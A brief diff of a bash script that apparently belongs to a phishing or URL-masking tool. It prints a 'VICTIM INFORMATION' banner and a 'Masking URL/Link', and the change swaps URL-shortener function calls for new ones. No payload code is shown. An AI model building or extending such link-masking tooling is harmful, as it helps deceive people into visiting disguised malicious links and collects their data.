@@ -63,8 +63,7 @@ logo_last
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
-
-url_shortner_c
+askuri_c
 clear
 logo_last
 sleep 3
@@ -90,7 +89,7 @@ logo_last
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
-url_shortner_n
+askuri_n
 clear
 logo_last
 sleep 3
@@ -183,8 +182,6 @@ echo -e " \e[91m[\e[92m★\e[91m] \e[93mYour Masking URL/Link:\e[32m ${final_url
 echo -e ""
 echo -e ""
 }
-
-
 
 
 
